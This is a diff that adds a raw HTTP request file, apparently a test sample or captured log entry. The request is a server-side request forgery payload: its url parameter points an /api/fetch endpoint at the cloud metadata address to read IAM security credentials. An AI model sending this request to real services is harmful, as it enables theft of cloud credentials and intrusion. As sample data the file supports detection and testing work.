@@ -1,0 +1,13 @@
+GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 138.168.114.157
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 208.122.205.190,207.116.102.133
+X-Cloud-Trace-Context: 076b3e36bb2313f55b06258e7e26f36a/257674050322999590
+
